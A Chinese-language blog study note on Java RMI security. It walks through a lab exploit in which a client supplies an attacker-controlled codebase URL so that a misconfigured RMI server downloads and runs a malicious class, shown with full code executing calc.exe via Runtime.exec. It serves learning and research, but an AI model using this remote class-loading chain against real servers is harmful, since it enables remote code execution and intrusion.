<p>上述代码中，第一行是创建并运行<code>RMI Registry</code>，第二行是将<code>RemoteHelloWorld</code>对象绑定到<code>Hello</code>这个<code>Name</code>上。</p>
<p><code>Naming.bind</code>的第一个参数是<code>url</code>，格式为<code>rmi://host:post/name</code>。这里的<code>host</code>和<code>post</code>就是<code>RMI Registry</code>的地址和端口，<code>name</code>就是远程对象绑定的名字。</p>
<p>不过，如果<code>RMI Registry</code>在本地运行，那么<code>host</code>和<code>port</code>是<u>可以省略</u>的，<code>host</code>默认为<code>localhost</code>，<code>port</code>默认是<code>1099</code></p>
<p>直接保留<code>name</code>就行，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Naming.bind(<span class="string">&quot;Hello&quot;</span>,<span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>());</span><br></pre></td></tr></table></figure>

<p>第一篇大致讲了RMI整体的原理和流程，那么接下来自然要想到RMI会有哪些安全问题，可以分为两个方向</p>
<blockquote>
<ul>
<li>如果我们能够访问<code>RMI Registry</code>，将如何对其进行攻击？</li>
<li>如果我们可以控制目标RMI客户端中的<code>Naming.lookup</code>的第一个参数，也就是<code>RMI Registry</code>的地址和端口，能不能进行攻击？</li>
</ul>
</blockquote>
<span id="more"></span>

<h1 id="Java安全-RMI-2"><a href="#Java安全-RMI-2" class="headerlink" title="Java安全[RMI(2)]"></a>Java安全[RMI(2)]</h1><blockquote>
<p>复现文章过程中遇到了很多问题，本文不全展示，请自行理解和搜索，动手操作学到更多</p>
</blockquote>
<h2 id="如何攻击RMI-Registry"><a href="#如何攻击RMI-Registry" class="headerlink" title="如何攻击RMI Registry?"></a>如何攻击RMI Registry?</h2><p>从第一篇RMI文章中提到，服务器端用<code>Naming.rebind</code>绑定对象。比如下面代码就将<code>RemoteHelloWorld</code>类实例绑定在<code>Registry</code>中的<code>Hello</code>名上，<code>192.168.135.142:1099</code>是<code>RMI Registry</code>的地址和端口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://192.168.169.131:1099/Hello&quot;</span>, h);</span><br></pre></td></tr></table></figure>

<p>我们同时也知道在客户端也可以调用<code>Naming</code>，并且可以在<code>RMI Registry</code>中进行<code>lookup</code>查找，如果客户端也进行<code>rebind</code>，可不可以将<code>Hello</code>对应的对象修改覆盖掉呢？</p>
<p>可以先在本机上启动一个类似的<code>server</code>绑定虚拟机里的<code>Registry</code>，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230924170229091.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924170229091.png" alt="image-20230924170229091"></a></p>
<p>但是发生报错，提示当前并非<code>localhost</code></p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230924170622609.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924170622609.png" alt="image-20230924170622609"></a></p>
<blockquote>
<p>这也是因为Java对远程访问<code>RMI Registry</code>做了限制，只有当请求访问的<code>源地址是localhost</code>时候，才可以进行调用<code>rebind,bind,unbind</code>等方法。</p>
</blockquote>
<blockquote>
<p>不过如果至少单纯列出绑定对象或者查找绑定对象，是没有这个限制的，如<code>list</code>和<code>lookup</code>方法是可以远程调用的。</p>
</blockquote>
<p>为了更加直观，现在虚拟机的服务器端，绑定了三个Name</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230924172154462.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924172154462.png" alt="image-20230924172154462"></a></p>
<p>客户端代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMI_Client_list</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] s = Naming.list(<span class="string">&quot;rmi://192.168.169.131:1099&quot;</span>);</span><br><span class="line">        System.out.println(Arrays.toString(s));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230924172636783.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230924172636783.png" alt="image-20230924172636783"></a></p>
<blockquote>
<p>lookup作用就是获得某个远程对象。那么，只要目标服务器上存在一些危险方法，我们通过RMI就可以对其进行调用，之前曾经有一个工具 <a href="https://github.com/NickstaDB/BaRMIe%EF%BC%8C%E5%85%B6%E4%B8%AD%E4%B8%80%E4%B8%AA%E5%8A%9F%E8%83%BD%E5%B0%B1%E6%98%AF%E8%BF%9B%E8%A1%8C%E5%8D%B1%E9%99%A9%E6%96%B9%E6%B3%95%E7%9A%84%E6%8E%A2%E6%B5%8B%E3%80%82">https://github.com/NickstaDB/BaRMIe，其中一个功能就是进行危险方法的探测。</a> 但是显然，RMI的攻击面绝不仅仅是这样没营养。</p>
</blockquote>
<h2 id="RMI利用codebase执行任意代码"><a href="#RMI利用codebase执行任意代码" class="headerlink" title="RMI利用codebase执行任意代码"></a>RMI利用<code>codebase</code>执行任意代码</h2><p>大部分的Java的漏洞都是远程进行利用恶意类，但是在怎么让目标服务器能够下载并加载自己的恶意服务器上的恶意类，这里就涉及到了<code>codebase</code>。</p>
<p>曾经浏览器可以直接运行<code>java</code>，就是通过<code>Applet</code>标签，但是在<code>HTML5</code>中不再支持，并在<code>HTML 4.01</code> 中不赞成使用 <code>&lt;applet&gt;</code> 元素。</p>
<blockquote>
<p>Applet 是一种 Java 程序。它一般运行在支持 Java 的 Web 浏览器内。因为它有完整的 Java API支持,所以Applet 是一个全功能的 Java 应用程序。</p>
<p><code>&lt;applet&gt; 标签在 HTML 4 中用于定义嵌入式小程序（插件）。</code></p>
</blockquote>
<p>使用<code>Applet</code>的时候通常需要指定一个<code>codebase</code>属性，如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">applet</span> <span class="attr">code</span>=<span class="string">&quot;HelloWorld.class&quot;</span> <span class="attr">codebase</span>=<span class="string">&quot;Applets&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span class="string">&quot;600&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">applet</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在RMI中远程加载时也同时涉及到了<code>codebase</code></p>
<blockquote>
<p><code>codebase</code>是一个地址，<u>告诉Java虚拟机我们应该从哪个地方去搜索类</u>，有点像我们日常用的 <code>CLASSPATH</code>，但<code>CLASSPATH</code>是本地路径，而<code>codebase</code>通常是远程<code>URL</code>，比如<code>http</code>、<code>ftp</code>等。</p>
</blockquote>
<p>如果指定<code>codebase=http://example.com/</code>，然后加载<code>org.vulhub.example.Example</code> 类，则java虚拟机就会下载<code>http://example.com/org/vulhub/example/Example.class</code>，并作为<code>Example</code>类的字节码。</p>
<p>在RMI中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻找类。<strong>如果某一端反序列化时发现一个对象，它会先从自己的<code>CLASSPATH</code>中进行寻找对应的类，如果在本地还是找不到，就会远程去加载<code>codebase</code>中的类。</strong></p>
<p>所以如果<code>codebase</code>被控制，那么我们写上我们恶意类的<code>CLASSPATH</code>，当服务端本地加载不到的时候，就会通过我们控制的<code>codebase</code>下载恶意类，最后达到加载恶意类的目的。</p>
<blockquote>
<p>在RMI中，codebase可以随着序列化数据一起传输，服务端接收到这个数据后，就先在CLASSPATH中寻找，然后去指定的codebase寻找类。最后就可能被<code>codebase</code>指向的恶意类控制导致被getshell或者任意命令执行。</p>
</blockquote>
<h3 id="环境配置和代码编写"><a href="#环境配置和代码编写" class="headerlink" title="环境配置和代码编写"></a>环境配置和代码编写</h3><p>环境配置，只有满足如下条件的RMI服务器才能被攻击</p>
<blockquote>
<ul>
<li><p>安装并配置了SecurityManager </p>
</li>
<li><p>Java版本低于<code>7u21</code>、<code>6u45</code>，或者设置了 <code>java.rmi.server.useCodebaseOnly=false</code></p>
</li>
</ul>
</blockquote>
<blockquote>
<p>其中 <code>java.rmi.server.useCodebaseOnly</code> 是在<code>Java 7u21</code>、<code>6u45</code>的时候修改的一个默认设置： </p>
<ul>
<li><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a> </li>
<li><a href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li>
</ul>
</blockquote>
<p>我的环境</p>
<blockquote>
<p>配置环境犯了个低级错误，客户端的java版本太高，编译出来的类文件无法被服务器的低版本java虚拟机加载，导致codebase指向的恶意类无法被正确加载</p>
</blockquote>
<blockquote>
<p>服务端：</p>
<ul>
<li>ip: <code>192.168.169.136</code></li>
<li><code>java 17.5</code></li>
</ul>
<p>客户端：</p>
<ul>
<li>ip: <code>192.168.169.1</code></li>
<li><code>java 17.0.5</code></li>
</ul>
</blockquote>
<p>服务端的四个文件，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// RemoteRMIServer.java</span></span><br><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteRMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;setup SecurityManager&quot;</span>);</span><br><span class="line">            System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">SecurityManager</span>());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Calc</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Calc</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;refObj&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RemoteRMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Calc.java</span></span><br><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ICalc.java</span></span><br><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ICalc</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">sum</span><span class="params">(List&lt;Integer&gt; params)</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// client.policy</span></span><br><span class="line">grant &#123;</span><br><span class="line">permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后编译三个java文件，并运行服务端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac *</span><br><span class="line"></span><br><span class="line">java -Djava.rmi.server.hostname=192.168.169.136 -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.security.policy=client.policy -<span class="built_in">cp</span> E:\Java_Study\src\main\java RMI_2.RemoteRMIServer</span><br></pre></td></tr></table></figure>

<blockquote>
<p>*注意，第二段命令我是在<code>cmd</code>中运行，如果在<code>powershell</code>中运行需要把-D和java用引号分开，如</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -D<span class="string">&quot;java.rmi.server.hostname=192.168.169.136&quot;</span> -D<span class="string">&quot;java.rmi.server.useCodebaseOnly=false&quot;</span> -D<span class="string">&quot;java.security.policy=client.policy&quot;</span> -<span class="built_in">cp</span> E:\Java_Study\src\main\java RMI_2.RemoteRMIServer</span><br></pre></td></tr></table></figure>
</blockquote>
<p>执行后如下图，<code>client.policy</code>文件用于配置协议关闭<code>java.security</code>，</p>
<p>执行时加上<code>java.rmi.server.useCodebaseOnly=false</code>允许服务端从RMI请求中获取加载<code>codebase</code>，若为<code>true</code>则java虚拟机将只信任预先配置好的<code>codebase</code>。</p>
<p><code>java.rmi.server.hostname=192.168.168.131</code>为服务端<code>ip</code>，也是客户端要访问的<code>ip</code></p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014155150325.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014155150325.png" alt="image-20231014155150325"></a></p>
<p>然后编写客户端，根据服务端文件的代码，指定这是一个运算加法的服务端，然后还有个<code>ICalc</code>接口文件，将其和客户端文件一个目录下。</p>
<p>客户端代码【p神的代码稍微在我环境下有点错误】</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014162311620.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014162311620.png" alt="image-20231014162311620"></a></p>
<p><u>主要是其中<code>Payload</code>这个内部类报错，因为在RMI中类是序列化传递的，如果内部类要被序列化传递，它必须是<code>static</code>的，否则会导致序列化问题。</u></p>
<blockquote>
<p><code>内部类不能被序列化！</code></p>
</blockquote>
<p>看到它是继承<code>ArrayList</code>，直接用<code>ArrayList</code>即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">-   <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">-   &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://192.168.169.136:1099/refObj&quot;</span>);</span><br><span class="line">-       List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">+       List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;Integer&gt;();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正常运行，发送到服务端，返回<code>3，4</code>相加后的结果<code>7</code></p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014162928158.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014162928158.png" alt="image-20231014162928158"></a></p>
<h3 id="指定codebase"><a href="#指定codebase" class="headerlink" title="指定codebase"></a>指定<code>codebase</code></h3><p>客户端再在<code>RMI</code>中指定<code>codebase</code>，向服务器发送请求，</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.rmi.server.codebase=http:<span class="comment">//example.com/ -cp E:\Ttoc\Desktop\JAVA\JAVA_Study\src\main\java RMIClient.java</span></span><br></pre></td></tr></table></figure>

<p>客户端先向远程对象发送codebase，并告诉了查询的类名称</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231017210721617.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017210721617.png" alt="image-20231017210721617"></a></p>
<p>发现果然服务端通过客户端发送的<code>codebase</code>信息，到目标网站下进行寻找访问类，<code>User-Agent</code>就是服务端的java虚拟机。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014165043675.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014165043675.png" alt="image-20231014165043675"></a></p>
<p>最后<code>example.com</code>响应返回404</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014165505720.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014165505720.png" alt="image-20231014165505720"></a></p>
<p>当然这里如果代码和p神一样也是可以的，还可以看到服务端也查找了内部类<code>RMIClient$Payload</code>，只不过客户端最后输出会报错，但是客户端还是成功把<code>codebase</code>发送给了服务端，服务端也在底下寻找内部类</p>
<blockquote>
<p>可以从下方返回的数据包的顺序，知道服务器先寻找内部类，再寻找外部类</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231014171626991.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231014171626991.png" alt="image-20231014171626991"></a></p>
<h3 id="加载恶意类"><a href="#加载恶意类" class="headerlink" title="加载恶意类"></a>加载恶意类</h3><p>上面的流量分析知道服务端的<code>java</code>虚拟机确实会访问<code>codebase</code>的类文件，所以我们只需要把<code>/RMIClient$Payload.class</code> 改成恶意类即可，当然在<code>RMIClient</code>中写上恶意类也可以，这里以在内部类Payload为例子</p>
<p>加上恶意类后的代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">                <span class="type">String</span> <span class="variable">commands</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">                p.waitFor();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://192.168.169.146:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重新编译生成类文件</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">javac</span> <span class="regexp">*.java</span></span><br></pre></td></tr></table></figure>

<hr>
<blockquote>
<p>这里遇到一个坑，因为<code>Payload</code>是内部类，其本质还是为<code>RMIClient$Payload</code></p>
<p>而这里，我将恶意类写在了内部类中，所以最后服务端要执行内部类的静态方法也就是我们的恶意方法，还需要加载外部类<code>RMIClient</code>，所以我们需要将内部类<code>RMIClient$Payload</code>和外部类<code>RMIClient</code>都放在恶意服务器等着服务端加载</p>
<p>如果将恶意方法写在外部类中，就只有把外部类<code>RMIClient</code>放在恶意服务器上等着服务端加载就可以执行</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI_2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">            <span class="type">String</span> <span class="variable">commands</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> rt.exec(commands);</span><br><span class="line">            p.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Payload</span> <span class="keyword">extends</span> <span class="title class_">ArrayList</span>&lt;Integer&gt; &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ICalc</span> <span class="variable">r</span> <span class="operator">=</span> (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">&quot;rmi://192.168.169.146:1099/refObj&quot;</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> <span class="title class_">Payload</span>();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIClient</span>().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<p>因为服务端是虚拟机中运行，我直接在物理机用<code>wsl</code>安装<code>apache2</code>上把这两个类文件放上去(为什么放两个类，原因见上)</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231017222948310.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017222948310.png" alt="image-20231017222948310"></a></p>
<p>记得目录必须按照格式需要为包名</p>
<p>修改上面的<code>example.com</code>为<code>wsl</code>的<code>ip</code>即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -Djava.rmi.server.useCodebaseOnly=<span class="literal">false</span> -Djava.rmi.server.codebase=http:<span class="comment">//x.x.x.x/ -cp E:\Ttoc\Desktop\JAVA\JAVA_Study\src\main\java RMIClient.java</span></span><br></pre></td></tr></table></figure>

<p>可以看到访问成功，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231017223047942.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017223047942.png" alt="image-20231017223047942"></a></p>
<p>网站也将类的内容返回给java-vm</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231017213458878.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017213458878.png" alt="image-20231017213458878"></a></p>
<p>查看服务端</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20231017223143987.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20231017223143987.png" alt="image-20231017223143987"></a></p>
<p>执行成功</p>
<hr>
<p>*注意，进行RMI时，客户端接口文件的包名必须和服务器包名必须一样</p>
<p>如下，在<code>RMI_2</code>包中，我的接口文件的包名也是<code>RMI_2</code>，但是服务端的接口文件包名是<code>RMI_1</code></p>
<p>客户端：</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230921193958356.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193958356.png" alt="image-20230921193958356"></a></p>
<p>服务端：</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230921193926761.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193926761.png" alt="image-20230921193926761"></a></p>
<p>报错，</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230921193717284.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921193717284.png" alt="image-20230921193717284"></a></p>
<blockquote>
<p>这个异常是由于Java模块化系统引入的。在Java 9及更高版本中，引入了模块化系统，它会对类加载和模块之间的依赖关系进行更严格的控制。这个异常消息表明你<code>正在尝试将一个接口从一个模块加载到另一个模块</code>，而两者之间可能存在访问限制。</p>
<p>解决这个问题的方法之一是<code>确保你的RMI接口和实现都在相同的模块中</code>，或者在相同的模块路径下。这样，它们将属于同一模块，不会出现模块之间的访问问题。</p>
</blockquote>
<p>所以，只客户端只需要导入<code>RMI_1</code>包中的接口，就可以成功访问到服务端。</p>
<p><a data-fancybox="gallery" data-src="/Java%E5%AE%89%E5%85%A8%5BRMI(2)%5D/image-20230921194236577.png"><img src="/Java%E5%AE%89%E5%85%A8[RMI(2)]/image-20230921194236577.png" alt="image-20230921194236577"></a></p>
<hr>
]]></content>
      <categories>
        <category>Java漫谈学习</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全[RMI(1)]</title>
    <url>/Java%E5%AE%89%E5%85%A8%5BRMI(1)%5D/</url>
